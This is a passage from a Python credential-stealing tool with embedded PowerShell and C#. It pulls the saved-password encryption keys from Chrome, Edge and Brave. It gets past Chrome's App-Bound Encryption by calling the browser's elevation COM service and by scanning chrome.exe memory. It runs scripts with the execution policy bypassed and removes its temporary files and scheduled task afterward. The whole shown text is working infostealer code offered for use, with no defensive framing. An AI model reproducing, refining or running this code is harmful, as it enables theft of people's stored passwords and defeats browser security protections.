                try:
                    with open(dec_key_file, 'r') as f:
                        result = f.read().strip()
                    if result and result != 'FAILED':
                        try:
                            return base64.b64decode(result)
                        except Exception:
                            pass
                except Exception:
                    pass
                break

        return None

    except Exception:
        return None

    finally:
        try:
            subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'],
                          capture_output=True, timeout=5)
        except Exception:
            pass
        for f_path in [enc_key_file, dec_key_file, ps_script_file]:
            try:
                if os.path.exists(f_path):
                    os.remove(f_path)
            except Exception:
                pass


def _call_ielevator_com_ps(key_data, browser_type='chrome'):
    """Call Chrome/Edge IElevator COM interface via PowerShell with proper C# interop.

    CRITICAL FIX (v9): The old code used WRONG CLSID/IID!
      Old CLSID {708860E0-F641-4611-8597-DC3541B6DBEE} = Google Update Core Class (WRONG!)
      Old IID   {A9BD5A59-4F60-4F69-8E33-0C6D613557F6} = IGoogleUpdate interface (WRONG!)
    This was calling a completely different COM object, which is why IElevator
    returned 90 bytes of garbage instead of the 32-byte AES key.

    Correct IIDs (from Chromium source + xaitax tool):
      Chrome CLSID:  {708860E0-F641-4611-8895-7D867DD3675B}
      Edge CLSID:    {1FCBE96C-1697-43AF-9140-2897C7C69767}
      IElevatorChrome IID: {463ABECF-410D-407F-8AF5-0DF35A005CC8}
      IElevator IID:       {A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}

    Chrome vtable: DecryptData at slot 5 (offset 40)
    Edge vtable: DecryptData at slot 7 (offset 56) — extra IElevatorEdgeBase methods

    Requires: Admin + Chrome Elevation Service running
    """
    if not IS_WINDOWS:
        return None

    try:
        # Start elevation services
        svc_names = ['GoogleChromeElevationService', 'chrome_elevation_service',
                     'MicrosoftEdgeElevationService', 'edge_elevation_service']
        for svc_name in svc_names:
            try:
                subprocess.run(['sc', 'start', svc_name],
                              capture_output=True, timeout=5)
            except Exception:
                pass
        time.sleep(3)

        key_b64 = base64.b64encode(key_data).decode('ascii')

        # Build PowerShell script with C# interop for IUnknown COM interface
        # v9 FIX: Use CORRECT CLSID/IID for Chrome Elevation Service!
        # Also try multiple IIDs: IElevatorChrome first, then IElevator base.
        # Edge uses a different CLSID and has extra vtable methods (IElevatorEdgeBase).
        ps_script = r'''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

// ========== Chrome Elevation Service COM ==========
[ComImport]
[Guid("708860E0-F641-4611-8895-7D867DD3675B")]
class ChromeElevatorSvc { }

// ========== Edge Elevation Service COM ==========
[ComImport]
[Guid("1FCBE96C-1697-43AF-9140-2897C7C69767")]
class EdgeElevatorSvc { }

// ========== IElevatorChrome — Chrome's actual interface (Chrome 127+) ==========
[ComImport]
[Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IElevatorChrome {
    // Slot 3: RunRecoveryCRXElevated
    [PreserveSig]
    int RunRecoveryCRXElevated(
        [In] IntPtr binding,
        [In] IntPtr crx_path,
        [In] IntPtr browser_app_path,
        [In] IntPtr browser_app_profile_path,
        [In] IntPtr browser_app_l10n_path,
        [In] IntPtr browser_app_temp_path,
        [Out] out IntPtr hwnd_run_dialog,
        [Out] out IntPtr callback
    );
    // Slot 4: EncryptData
    [PreserveSig]
    int EncryptData(
        [In] uint protection_level,
        [In] byte[] plaintext,
        [In] uint plaintext_len,
        [Out] out IntPtr ciphertext,
        [In, Out] ref uint ciphertext_len
    );
    // Slot 5: DecryptData
    [PreserveSig]
    int DecryptData(
        [In] byte[] encrypted_data,
        [In] uint encrypted_data_len,
        [Out] out IntPtr plaintext,
        [In, Out] ref uint plaintext_len
    );
}

// ========== IElevator base — fallback interface ==========
[ComImport]
[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IElevator {
    [PreserveSig]
    int RunRecoveryCRXElevated(
        [In] IntPtr binding,
        [In] IntPtr crx_path,
        [In] IntPtr browser_app_path,
        [In] IntPtr browser_app_profile_path,
        [In] IntPtr browser_app_l10n_path,
        [In] IntPtr browser_app_temp_path,
        [Out] out IntPtr hwnd_run_dialog,
        [Out] out IntPtr callback
    );
    [PreserveSig]
    int EncryptData(
        [In] uint protection_level,
        [In] byte[] plaintext,
        [In] uint plaintext_len,
        [Out] out IntPtr ciphertext,
        [In, Out] ref uint ciphertext_len
    );
    [PreserveSig]
    int DecryptData(
        [In] byte[] encrypted_data,
        [In] uint encrypted_data_len,
        [Out] out IntPtr plaintext,
        [In, Out] ref uint plaintext_len
    );
}

// ========== IElevatorEdge — Edge has extra IElevatorEdgeBase methods ==========
// Edge: Slot 3-5 = IElevatorEdgeBase (3 methods), Slot 6 = RunRecoveryCRXElevated,
// Slot 7 = EncryptData, Slot 8 = DecryptData
[ComImport]
[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IElevatorEdge {
    // Slots 3-5: IElevatorEdgeBase stubs (3 unknown methods from Edge base class)
    [PreserveSig] int EdgeBaseMethod1([In] IntPtr p1, [In] IntPtr p2);
    [PreserveSig] int EdgeBaseMethod2([In] IntPtr p1, [In] IntPtr p2);
    [PreserveSig] int EdgeBaseMethod3([In] IntPtr p1, [In] IntPtr p2);
    // Slot 6: RunRecoveryCRXElevated
    [PreserveSig]
    int RunRecoveryCRXElevated(
        [In] IntPtr binding, [In] IntPtr crx_path, [In] IntPtr browser_app_path,
        [In] IntPtr browser_app_profile_path, [In] IntPtr browser_app_l10n_path,
        [In] IntPtr browser_app_temp_path,
        [Out] out IntPtr hwnd_run_dialog, [Out] out IntPtr callback
    );
    // Slot 7: EncryptData
    [PreserveSig]
    int EncryptData(
        [In] uint protection_level, [In] byte[] plaintext, [In] uint plaintext_len,
        [Out] out IntPtr ciphertext, [In, Out] ref uint ciphertext_len
    );
    // Slot 8: DecryptData
    [PreserveSig]
    int DecryptData(
        [In] byte[] encrypted_data, [In] uint encrypted_data_len,
        [Out] out IntPtr plaintext, [In, Out] ref uint plaintext_len
    );
}
"@ -Language CSharp

$key_bytes = [Convert]::FromBase64String("''' + key_b64 + r'''" )

function Try-Decrypt {
    param($elevator_obj, $iface_type)
    try {
        $elevator = [System.Runtime.InteropServices.Marshal]::GetTypedObjectForIUnknown(
            [System.Runtime.InteropServices.Marshal]::GetIUnknownForObject($elevator_obj),
            $iface_type
        )
        $plainLen = [uint32]0
        $plainPtr = [IntPtr]::Zero
        $hr = $elevator.DecryptData($key_bytes, [uint32]$key_bytes.Length, [ref]$plainPtr, [ref]$plainLen)
        if ($hr -eq 0 -and $plainLen -gt 0 -and $plainLen -le 4096) {
            $result_bytes = New-Object byte[] $plainLen
            [System.Runtime.InteropServices.Marshal]::Copy($plainPtr, $result_bytes, 0, [int]$plainLen)
            [System.Runtime.InteropServices.Marshal]::FreeCoTaskMem($plainPtr)
            return [Convert]::ToBase64String($result_bytes)
        } else {
            if ($plainPtr -ne [IntPtr]::Zero) { [System.Runtime.InteropServices.Marshal]::FreeCoTaskMem($plainPtr) }
            Write-Verbose "DecryptData failed: hr=$hr len=$plainLen"
        }
    } catch {
        Write-Verbose "Interface cast/call failed: $($_.Exception.Message)"
    }
    return $null
}

# === Strategy 1: Chrome CLSID + IElevatorChrome IID ===
try {
    $svc = New-Object ChromeElevatorSvc
    $result = Try-Decrypt $svc ([IElevatorChrome])
    if ($result) { Write-Output $result; exit 0 }
} catch {}

# === Strategy 2: Chrome CLSID + IElevator base IID ===
try {
    $svc = New-Object ChromeElevatorSvc
    $result = Try-Decrypt $svc ([IElevator])
    if ($result) { Write-Output $result; exit 0 }
} catch {}

# === Strategy 3: Edge CLSID + IElevatorEdge IID ===
try {
    $svc = New-Object EdgeElevatorSvc
    $result = Try-Decrypt $svc ([IElevatorEdge])
    if ($result) { Write-Output $result; exit 0 }
} catch {}

# === Strategy 4: Edge CLSID + IElevatorChrome IID (some Edge versions) ===
try {
    $svc = New-Object EdgeElevatorSvc
    $result = Try-Decrypt $svc ([IElevatorChrome])
    if ($result) { Write-Output $result; exit 0 }
} catch {}

Write-Output "COM_ALL_FAILED"
'''

        # Write PS script to temp file to avoid command-line escaping issues
        import tempfile
        ps_file = os.path.join(tempfile.gettempdir(), 'vf_ielevator.ps1')
        with open(ps_file, 'w', encoding='utf-8') as f:
            f.write(ps_script)

        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-NonInteractive', '-File', ps_file],
            capture_output=True, text=True, timeout=45,
            encoding='utf-8', errors='replace'
        )

        # Clean up
        try:
            os.remove(ps_file)
        except Exception:
            pass

        output = result.stdout.strip()
        if output and not output.startswith('COM_'):
            try:
                return base64.b64decode(output)
            except Exception:
                pass

        # Store diagnostic info
        if output:
            _chrome_diag.setdefault('_ielevator', {})['output'] = output[:200]
        if result.stderr:
            _chrome_diag.setdefault('_ielevator', {})['stderr'] = result.stderr[:200]

    except Exception as e:
        _chrome_diag.setdefault('_ielevator', {})['exception'] = str(e)[:200]

    return None


def _extract_key_from_chrome_memory():
    """Extract decrypted AES key from Chrome process memory (last resort).

    Chrome keeps the decrypted AES key in memory while it's running.
    We scan the Chrome process heap for patterns that match AES-256 key blobs.
    This approach works when IElevator COM and DPAPI-as-SYSTEM both fail.

    Requires: Admin privileges, Chrome must be running.
    """
    if not IS_WINDOWS:
        return None

    try:
        import ctypes
        import struct

        # Find chrome.exe PIDs
        task_result = subprocess.run(
            ['tasklist', '/FI', 'IMAGENAME eq chrome.exe', '/FO', 'CSV', '/NH'],
            capture_output=True, text=True, timeout=5
        )
        chrome_pids = []
        for line in task_result.stdout.strip().split('\n'):
            parts = line.strip('"').split('","')
            if len(parts) >= 2 and parts[0].lower() == 'chrome.exe':
                try:
                    chrome_pids.append(int(parts[1]))
                except ValueError:
                    pass

        if not chrome_pids:
            _chrome_diag.setdefault('_memory_scan', {})['error'] = 'Chrome not running'
            return None

        _chrome_diag.setdefault('_memory_scan', {})['chrome_pids'] = chrome_pids[:5]

        # Use PowerShell to dump Chrome process memory and search for AES key
        # AES-256 keys in Chrome are 32 bytes. We look for the key pattern
        # by searching for v10/v20 prefixes in memory near key material.
        import tempfile
        ps_file = os.path.join(tempfile.gettempdir(), 'vf_mem_scan.ps1')
        result_file = os.path.join(tempfile.gettempdir(), 'vf_mem_result.txt')

        ps_script = r'''
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;

public class MemoryScanner {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEM_INFO {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }

    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [StructLayout(LayoutKind.Sequential)]
    struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_WRITECOPY = 0x08;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_WRITECOPY = 0x80;

    public static string ScanForKey(int pid) {
        IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return "FAILED_OPEN";

        try {
            SYSTEM_INFO si;
            GetSystemInfo(out si);
            IntPtr addr = si.lpMinimumApplicationAddress;
            List<byte> keyCandidates = new List<byte>();

            while (addr.ToInt64() < si.lpMaximumApplicationAddress.ToInt64()) {
                MEMORY_BASIC_INFORMATION mbi;
                int result = VirtualQueryEx(hProcess, addr, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                if (result == 0) break;

                if (mbi.State == MEM_COMMIT &&
                    (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_WRITECOPY ||
                     mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_WRITECOPY)) {

                    int bytesRead;
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, buffer.Length, out bytesRead)) {
                        // Search for v10 or v20 prefix followed by 12 bytes nonce + ciphertext
                        for (int i = 0; i < bytesRead - 50; i++) {
                            if (buffer[i] == 0x76 && buffer[i+1] == 0x31 && buffer[i+2] == 0x30) {
                                // Found "v10" - the AES key is likely nearby
                                // Look for 32-byte key pattern before this
                                if (i >= 32) {
                                    byte[] key = new byte[32];
                                    Array.Copy(buffer, i - 32, key, 0, 32);
                                    // Check if it looks like a valid key (not all zeros, not all 0xFF)
                                    bool allZero = true, allFF = true;
                                    foreach (byte b in key) {
                                        if (b != 0) allZero = false;
                                        if (b != 0xFF) allFF = false;
                                    }
                                    if (!allZero && !allFF) {
                                        return Convert.ToBase64String(key);
                                    }
                                }
                            }
                        }
                    }
                }
                addr = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
            }
            return "KEY_NOT_FOUND";
        } finally {
            CloseHandle(hProcess);
        }
    }
}
"@ -Language CSharp

$pids = ''' + ','.join(str(p) for p in chrome_pids[:3]) + r'''.Split(',') | ForEach-Object { [int]$_ }
foreach ($pid in $pids) {
    $result = [MemoryScanner]::ScanForKey($pid)
    if ($result -notmatch '^(FAILED|KEY_NOT)') {
        Write-Output $result
        exit
    }
}
Write-Output "KEY_NOT_FOUND_ALL"
'''

        with open(ps_file, 'w', encoding='utf-8') as f:
            f.write(ps_script)

        try:
            result = subprocess.run(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-NonInteractive', '-File', ps_file],
                capture_output=True, text=True, timeout=60,
                encoding='utf-8', errors='replace'
            )

            output = result.stdout.strip()
            _chrome_diag.setdefault('_memory_scan', {})['output'] = output[:200]

            if output and not output.startswith('KEY_NOT') and not output.startswith('FAILED'):
                try:
                    key = base64.b64decode(output)
                    if len(key) == 32:
                        _chrome_diag['_memory_scan']['success'] = True
                        return key
                except Exception:
                    pass
        finally:
            try:
                os.remove(ps_file)
                if os.path.exists(result_file):
                    os.remove(result_file)
            except Exception:
                pass

    except Exception as e:
        _chrome_diag.setdefault('_memory_scan', {})['exception'] = str(e)[:200]

    return None

def _dpapi_decrypt_ctypes(data):
    """Decrypt data using Windows DPAPI via ctypes (no pywin32 needed)."""
    if not IS_WINDOWS:
        return None
    try:
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_ubyte))
            ]

        p = ctypes.create_string_buffer(data, len(data))
        blob_in = DATA_BLOB(len(data), ctypes.cast(p, ctypes.POINTER(ctypes.c_ubyte)))
        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted
        return None
    except Exception:
        return None


def _get_chrome_encryption_key(browser_type="chrome"):
    """Get and cache the Chrome/Edge/Brave AES encryption key from Local State.
    v6: Returns BOTH keys separately — DPAPI key (v10/v11) AND App-Bound key (v20).
    
    Chrome 127+ can have BOTH types of encrypted passwords:
    - v10/v11: AES-256-GCM with key from 'encrypted_key' (DPAPI-protected)
    - v20: AES-256-GCM with key from 'app_bound_encrypted_key' (IElevator COM)
    
    We need BOTH keys because a single Chrome profile can contain
    passwords encrypted with different versions.
    """
    # Return cached tuple if available
    cache_key = browser_type + "_v2"
    if cache_key in _chrome_key_cache:
        return _chrome_key_cache[cache_key]
    
    diag = {"browser": browser_type, "local_state_found": False, "key_extracted": False}
    
    try:
        if IS_WINDOWS:
            if browser_type == "chrome":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Google', 'Chrome', 'User Data', 'Local State'
                )
            elif browser_type == "edge":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Microsoft', 'Edge', 'User Data', 'Local State'
                )
            elif browser_type == "brave":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'
                )
            else:
                _chrome_key_cache[cache_key] = (None, None)
                _chrome_diag[browser_type] = {**diag, "error": "unknown browser"}
                return (None, None)
        else:
            if browser_type == "chrome":
                local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
            elif browser_type == "edge":
                local_state_path = os.path.expanduser('~/.config/microsoft-edge/Local State')
            elif browser_type == "brave":
                local_state_path = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Local State')
            else:
                _chrome_key_cache[cache_key] = (None, None)
                _chrome_diag[browser_type] = {**diag, "error": "unknown browser"}
                return (None, None)

        if not os.path.exists(local_state_path):
            _chrome_key_cache[cache_key] = (None, None)
            _chrome_diag[browser_type] = {**diag, "error": "Local State not found"}
            return (None, None)

        diag["local_state_found"] = True

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        os_crypt = local_state.get('os_crypt', {})
        
        # Check Chrome version for App-Bound Encryption detection
        browser_version = None
        if browser_type in ("chrome", "edge"):
            browser_version = local_state.get('browser', {}).get('version', '')
        
        if browser_version:
            diag["browser_version"] = browser_version
        
        # Check for App-Bound Encryption (Chrome 127+)
        app_bound_key_b64 = os_crypt.get('app_bound_encrypted_key', '')
        has_app_bound = bool(app_bound_key_b64)
        diag["has_app_bound_encryption"] = has_app_bound
        
        if has_app_bound:
            diag["app_bound_key_version"] = os_crypt.get('app_bound_key_version', 'unknown')
        
        # ============================================================
        # Extract DPAPI key (for v10/v11 passwords) — ALWAYS try this
        # ============================================================
        encrypted_key_b64 = os_crypt.get('encrypted_key', '')
        dpapi_key = None
        
        if encrypted_key_b64:
            try:
                encrypted_key = base64.b64decode(encrypted_key_b64)
                diag["encrypted_key_prefix"] = encrypted_key[:5].decode('ascii', errors='replace')
                
                if IS_WINDOWS:
                    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                    
                    # Try win32crypt first
                    dpapi_method = "none"
                    try:
                        import win32crypt
                        dpapi_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        dpapi_method = "win32crypt"
                    except ImportError:
                        pass
                    except Exception as e:
                        diag["win32crypt_error"] = str(e)[:100]
                    
                    # Fallback: ctypes DPAPI
                    if dpapi_key is None:
                        dpapi_key = _dpapi_decrypt_ctypes(encrypted_key)
                        if dpapi_key:
                            dpapi_method = "ctypes_dpapi"
                    
                    diag["dpapi_method"] = dpapi_method
                else:
                    # Linux: PBKDF2 with 'peanuts' password
                    try:
                        from Crypto.Cipher import AES
                        from Crypto.Protocol.KDF import PBKDF2
                        from Crypto.Hash import SHA1, HMAC
                        salt = b'saltysalt'
                        dpapi_key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
                                    prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
                        diag["dpapi_method"] = "linux_pbkdf2"
                    except ImportError:
                        diag["dpapi_method"] = "none"
            except Exception as e:
                diag["encrypted_key_error"] = str(e)[:100]
        
        # ============================================================
        # Extract App-Bound key (for v20 passwords) — ALWAYS try if available
        # This is the CRITICAL fix: we try app_bound_key EVEN IF dpapi_key exists!
        # Old code had: "if has_app_bound and key is None" which skipped
        # app-bound extraction when dpapi_key was already found.
        # ============================================================
        app_bound_key = None
        app_bound_strategy = None
        if has_app_bound and IS_WINDOWS:
            try:
                app_bound_raw = base64.b64decode(app_bound_key_b64)
                diag["app_bound_key_prefix"] = app_bound_raw[:4].decode('ascii', errors='replace')
                
                # Strip the 'APPB' prefix if present
                if app_bound_raw[:4] == b'APPB':
                    app_bound_raw = app_bound_raw[4:]
                
                # --- v7: Call _decrypt_app_bound_via_ielevator which now returns (key, strategy) ---
                try:
                    ie_result = _decrypt_app_bound_via_ielevator(app_bound_raw)
                    if ie_result and isinstance(ie_result, tuple):
                        app_bound_key, app_bound_strategy = ie_result
                    elif ie_result:
                        # Backward compat: old return was just bytes
                        app_bound_key = ie_result
                        app_bound_strategy = "unknown"
                    if app_bound_key:
                        diag["app_bound_method"] = app_bound_strategy or "ielevator_success"
                        diag["app_bound_key_len"] = len(app_bound_key)
                except Exception as e:
                    diag["ielevator_error"] = str(e)[:100]
                
                # --- DPAPI fallback (only if IElevator strategies all failed) ---
                if app_bound_key is None:
                    try:
                        import win32crypt
                        fallback_key = win32crypt.CryptUnprotectData(app_bound_raw, None, None, None, 0)[1]
                        if fallback_key and len(fallback_key) == 32:
                            app_bound_key = fallback_key
                            app_bound_strategy = "dpapi_win32crypt"
                            diag["app_bound_dpapi"] = "win32crypt_success"
                    except ImportError:
                        pass
                    except Exception:
                        pass
                    
                    if app_bound_key is None:
                        fallback_key = _dpapi_decrypt_ctypes(app_bound_raw)
                        if fallback_key and len(fallback_key) == 32:
                            app_bound_key = fallback_key
                            app_bound_strategy = "dpapi_ctypes"
                            diag["app_bound_dpapi"] = "ctypes_success"
            except Exception as e:
                diag["app_bound_decode_error"] = str(e)[:100]
        
        # Cache BOTH keys as a tuple: (dpapi_key_for_v10v11, app_bound_key_for_v20)
        result = (dpapi_key, app_bound_key)
        _chrome_key_cache[cache_key] = result
        
        # Update diagnostics
        any_key = dpapi_key or app_bound_key
        diag["key_extracted"] = any_key is not None
        diag["dpapi_key_len"] = len(dpapi_key) if dpapi_key else 0
        diag["app_bound_key_len"] = len(app_bound_key) if app_bound_key else 0
        if not any_key:
            if has_app_bound:
                diag["error"] = "App-Bound Encryption active (Chrome 127+). Both keys failed. Run as Admin + Chrome must be running."
            else:
                diag["error"] = "DPAPI decryption failed for encrypted_key"
        _chrome_diag[browser_type] = diag
        return result

    except Exception as e:
        _chrome_key_cache[cache_key] = (None, None)
        diag["error"] = f"Exception: {str(e)[:100]}"
        _chrome_diag[browser_type] = diag
        return (None, None)


def _aes_gcm_decrypt(key, nonce, ciphertext, tag):
    """AES-GCM decrypt with pycryptodome OR cryptography library fallback.
    v7: Logs decryption errors for debugging instead of silently swallowing."""
    _last_aes_error = None
    
    # Try pycryptodome first
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ImportError:
        _last_aes_error = "pycryptodome_not_installed"
    except ValueError as e:
        _last_aes_error = f"pycryptodome:{str(e)[:80]}"
    except Exception as e:
        _last_aes_error = f"pycryptodome:{type(e).__name__}:{str(e)[:60]}"
    
    # Try cryptography library
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext + tag, None)
    except ImportError:
        if _last_aes_error is None:
            _last_aes_error = "cryptography_not_installed"
    except Exception as e:
        _last_aes_error = f"cryptography:{type(e).__name__}:{str(e)[:60]}"
    
    # Store the error for diagnostics
    _chrome_diag.setdefault('_aes_gcm_last_error', _last_aes_error)
    return None


def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM.
    v6: Uses BOTH keys — DPAPI key for v10/v11, App-Bound key for v20.
    Tries each key separately and picks the one that works.

    Chrome Encryption Versions:
    - v10/v11: AES-256-GCM with key from Local State 'encrypted_key' (DPAPI-protected)
    - v20: AES-256-GCM with key from Local State 'app_bound_encrypted_key' (Chrome 127+)
           App-Bound key is encrypted by Chrome Elevation Service (IElevator COM)
           Requires admin privileges + Chrome elevation service running

    Edge works because Edge uses the standard 'encrypted_key' (not app-bound).
    Chrome 127+ uses app-bound encryption which requires IElevator COM to decrypt.
    """
    try:
        if not encrypted_password:
            return "(empty)"

        # Detect encryption version
        enc_prefix = ""
        if len(encrypted_password) >= 3:
            enc_prefix = encrypted_password[:3].decode('ascii', errors='replace')

        if IS_WINDOWS:
            if enc_prefix in ('v10', 'v11', 'v20'):
                # Get BOTH keys: (dpapi_key, app_bound_key)
                keys = _get_chrome_encryption_key(browser_type)
                dpapi_key, app_bound_key = keys if isinstance(keys, tuple) else (keys, None)
                
                nonce = encrypted_password[3:15]
                ciphertext_tag = encrypted_password[15:]
                ciphertext = ciphertext_tag[:-16]
                tag = ciphertext_tag[-16:]

                # For v20: try app_bound_key FIRST, then dpapi_key as fallback
                # For v10/v11: try dpapi_key FIRST, then app_bound_key as fallback
                if enc_prefix == 'v20':
                    key_order = [
                        (app_bound_key, "app_bound"),
                        (dpapi_key, "dpapi"),
                    ]
                else:
                    key_order = [
                        (dpapi_key, "dpapi"),
                        (app_bound_key, "app_bound"),
                    ]

                for key, key_name in key_order:
                    if key is None:
                        continue
                    try:
                        result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
                        if result is not None:
                            return result.decode('utf-8', errors='replace')
                    except Exception:
                        continue

                # Both keys failed — build diagnostic message
                diag = _chrome_diag.get(browser_type, {})
                if enc_prefix == 'v20':
                    parts = ["v20_DECRYPT_FAILED"]
                    parts.append(f"dpapi_key={'yes' if dpapi_key else 'no'}")
                    parts.append(f"app_bound_key={'yes' if app_bound_key else 'no'}")
                    # v7: include key lengths for debugging
                    parts.append(f"dpapi_key_len={len(dpapi_key) if dpapi_key else 0}")
                    parts.append(f"app_bound_key_len={len(app_bound_key) if app_bound_key else 0}")
                    if diag.get("dpapi_method"):
                        parts.append(f"dpapi={diag['dpapi_method']}")
                    if diag.get("app_bound_method"):
                        parts.append(f"elevator={diag['app_bound_method']}")
                    elif diag.get("ielevator_error"):
                        parts.append(f"elevator_err={diag['ielevator_error'][:60]}")
                    if diag.get("app_bound_dpapi"):
                        parts.append(f"bound_dpapi={diag['app_bound_dpapi']}")
                    # IElevator COM details
                    ie_diag = _chrome_diag.get('_ielevator', {})
                    if ie_diag.get('output'):
                        parts.append(f"com={ie_diag['output'][:60]}")
                    if ie_diag.get('exception'):
                        parts.append(f"com_exc={ie_diag['exception'][:40]}")
                    # AES-GCM last error (v7: for debugging WHY decryption fails)
                    aes_err = _chrome_diag.get('_aes_gcm_last_error', '')
                    if aes_err:
                        parts.append(f"aes_err={aes_err[:60]}")
                    # Key validation details (v7: track if keys had wrong length)
                    kv_diag = _chrome_diag.get('_key_validation', {})
                    if kv_diag:
                        for k, v in kv_diag.items():
                            parts.append(f"kv_{k}={v}")
                    # Memory scan details
                    mem_diag = _chrome_diag.get('_memory_scan', {})
                    if mem_diag.get('success'):
                        parts.append("memscan=OK")
                    elif mem_diag.get('error'):
                        parts.append(f"memscan={mem_diag['error'][:30]}")
                    return f"[{'|'.join(parts)}]"
                else:
                    return f"[{enc_prefix}_DECRYPT_FAILED:dpapi={'yes' if dpapi_key else 'no'}]"

            # Fallback: Try DPAPI via win32crypt (older Chrome versions, unencrypted passwords)
            try:
                import win32crypt
                return win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1].decode('utf-8', errors='replace')
            except ImportError:
                pass
            except Exception:
                pass

            # Fallback: Try DPAPI via ctypes
            result = _dpapi_decrypt_ctypes(encrypted_password)
            if result:
                return result.decode('utf-8', errors='replace')

            if enc_prefix in ('v10', 'v11'):
                return f"[{enc_prefix}_DECRYPT_FAILED]"
            return "[DECRYPT_FAILED]"

        else:
            # Linux: AES-256-GCM for v10/v11/v20
            if enc_prefix in ('v10', 'v11', 'v20'):
                keys = _get_chrome_encryption_key(browser_type)
                dpapi_key, app_bound_key = keys if isinstance(keys, tuple) else (keys, None)
                
                nonce = encrypted_password[3:15]
                ciphertext_tag = encrypted_password[15:]
                ciphertext = ciphertext_tag[:-16]
                tag = ciphertext_tag[-16:]

                for key in [dpapi_key, app_bound_key]:
                    if key is None:
                        continue
                    try:
                        result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
                        if result is not None:
                            return result.decode('utf-8', errors='replace')
                    except Exception:
                        continue

            # Fallback: PBKDF2 direct (pre-v80 Linux Chrome)
            try:
                from Crypto.Cipher import AES
                from Crypto.Protocol.KDF import PBKDF2
                from Crypto.Hash import SHA1, HMAC
                salt = b'saltysalt'
                key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
                            prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
                iv = b' ' * 16
                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                decrypted = cipher.decrypt(encrypted_password)
                # Remove PKCS7 padding
                pad_len = decrypted[-1]
                if isinstance(pad_len, int) and 1 <= pad_len <= 16:
                    decrypted = decrypted[:-pad_len]
                return decrypted.decode('utf-8', errors='replace')
            except ImportError:
